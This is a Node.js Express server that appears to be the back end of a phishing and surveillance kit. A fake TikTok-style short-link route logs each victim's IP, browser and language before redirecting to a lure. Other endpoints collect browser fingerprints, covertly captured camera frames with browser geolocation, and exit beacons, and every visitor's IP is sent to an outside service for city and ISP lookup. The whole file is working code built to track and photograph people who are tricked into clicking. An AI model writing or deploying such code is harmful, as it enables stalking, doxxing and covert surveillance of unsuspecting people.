"use strict";

const express = require("express");
const fs = require("fs");
const path = require("path");
const http = require("http");

const app = express();
const PORT = process.env.PORT || 3000;
const CAPTURES = path.join(__dirname, "captures");
fs.mkdirSync(CAPTURES, { recursive: true });

app.disable("x-powered-by");
app.use(express.json({ limit: "12mb" }));

const clientIp = (req) => {
  const fwd = (req.headers["cf-connecting-ip"] || req.headers["x-forwarded-for"] || "").split(",")[0].trim();
  return fwd || (req.socket.remoteAddress || "").replace("::ffff:", "") || "unknown";
};

const logLine = (file, obj) => fs.appendFileSync(path.join(CAPTURES, file), JSON.stringify(obj) + "\n");

// ---- vt.tiktok style hop: /t/XXXX logs the click then forwards to the lure
app.get("/t/:code", (req, res) => {
  logLine("clicks.log", {
    t: new Date().toISOString(),
    code: req.params.code,
    ip: clientIp(req),
    ua: req.headers["user-agent"] || null,
    ref: req.headers.referer || null,
    lang: req.headers["accept-language"] || null
  });
  res.redirect(302, "/");
});

app.use(express.static(path.join(__dirname, "public")));

// ---- fire-and-forget geo enrichment from the server side (IP -> city/ISP)
function enrichGeo(ip) {
  if (!ip || ip === "unknown" || ip.startsWith("127.") || ip.startsWith("::1") || ip.startsWith("192.168.") || ip.startsWith("10.")) return;
  http.get(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`, (r) => {
    let raw = "";
    r.on("data", (c) => (raw += c));
    r.on("end", () => {
      try {
        const d = JSON.parse(raw);
        if (d.status === "success") logLine(`geo_${ip.replace(/[^a-z0-9]/gi, "_")}.json`, { t: new Date().toISOString(), ip, ...d });
      } catch (_) { /* non-fatal */ }
    });
  }).on("error", () => {});
}

// ---- browser fingerprint payload
app.post("/api/recon", (req, res) => {
  const ip = clientIp(req);
  logLine("recon.log", { t: new Date().toISOString(), ip, ua: req.headers["user-agent"] || null, ...req.body });
  enrichGeo(ip);
  res.json({ ok: true });
});

// ---- camera frames + browser geolocation, saved as jpg + json sidecar
app.post("/api/shot", (req, res) => {
  const ip = clientIp(req);
  const { image, label, meta } = req.body || {};
  if (typeof image !== "string" || !image.startsWith("data:image/jpeg;base64,")) {
    return res.status(400).json({ ok: false, err: "bad payload" });
  }
  const stamp = new Date().toISOString().replace(/[:.]/g, "-");
  const safeIp = ip.replace(/[^a-z0-9]/gi, "_");
  const base = `${stamp}_${safeIp}${label ? "_" + String(label).replace(/[^a-z0-9]/gi, "") : ""}`;
  fs.writeFileSync(path.join(CAPTURES, `${base}.jpg`), Buffer.from(image.slice(23), "base64"));
  fs.writeFileSync(path.join(CAPTURES, `${base}.json`), JSON.stringify({ t: new Date().toISOString(), ip, ua: req.headers["user-agent"] || null, ...(meta || {}) }, null, 2));
  res.json({ ok: true });
});

// final beacon (sendBeacon) so data survives a closed tab
app.post("/api/bye", (req, res) => {
  logLine("bye.log", { t: new Date().toISOString(), ip: clientIp(req), ua: req.headers["user-agent"] || null, ...req.body });
  res.json({ ok: true });
});

app.listen(PORT, () => console.log(`[vt-hop] listening on http://0.0.0.0:${PORT}  (captures -> ${CAPTURES})`));
